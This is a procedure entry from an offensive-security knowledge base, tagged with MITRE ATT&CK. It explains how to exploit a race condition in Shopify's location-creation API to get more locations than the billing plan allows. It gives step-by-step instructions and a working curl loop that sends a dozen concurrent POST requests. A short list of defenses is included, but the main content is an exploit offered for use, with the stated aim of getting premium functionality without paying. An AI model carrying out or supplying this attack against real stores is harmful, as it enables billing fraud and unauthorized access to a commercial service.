---
id: proc-send-concurrent-shopify-requests
tags:
  - race-condition
  - concurrent-requests
  - shopify
type: procedure
tools:
  - '[[tools/Burp-Suite]]'
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/curl-send-multiple-requests]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:24:22.618Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Send-Concurrent-Location-Creation-Requests

## Summary

This procedure replays the intercepted location creation request multiple times simultaneously to exploit the race condition, allowing creation of excess locations beyond billing limits.

## Description

Shopify's location creation lacks proper locking, so concurrent requests can pass the limit check before updates are applied. Using the captured request, send 10+ copies in parallel via proxy repeater or scripted curl, targeting the same endpoint. This results in unauthorized locations, providing premium functionality without payment.

## Requirements

1. Intercepted HTTP request from prior procedure
2. Proxy tool or curl for request replay
3. Stable internet connection to Shopify API

## Defense

Defensive measures and detection strategies:

- Enforce transactional atomicity with database locks during creation
- Implement idempotency keys to deduplicate concurrent requests
- Log and alert on high concurrency from single IP/session

## Objectives

1. Flood the endpoint with identical requests to bypass checks
2. Create multiple locations in a single burst
3. Achieve limit evasion without triggering errors

## Instructions

### Step 1: Prepare Request in Proxy

**Context**: Load the intercepted request into Burp Repeater for manual replay.

**Command** ([[commands/load-request-burp]]):
```bash
# Burp UI action: Paste request into Repeater tab
```

> Copy the full request (method, URL, headers, body) into Repeater. Expected output: Request loaded and ready for sending.

### Step 2: Send Multiple Concurrent Requests

**Context**: Replay the request 10-15 times in quick succession or parallel.

**Command** ([[commands/curl-send-multiple-requests]]):
```bash
for i in {1..12}; do curl -X POST 'https://yourstore.myshopify.com/admin/api/2023-10/locations.json' -H 'Authorization: Bearer your-access-token' -H 'Content-Type: application/json' -d '{"location":{"name":"Test Loc $i","address1":"123 St"}}' & done
```

> Use background processes (&) for concurrency or Burp's Turbo Intruder extension. Expected output: Multiple 201 Created responses, each with a new location ID.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used

- [[commands/load-request-burp]]
- [[commands/curl-send-multiple-requests]]

## Tools Used

- [[tools/Burp-Suite]]

## Tags

- race-condition
- concurrent-requests
- shopify
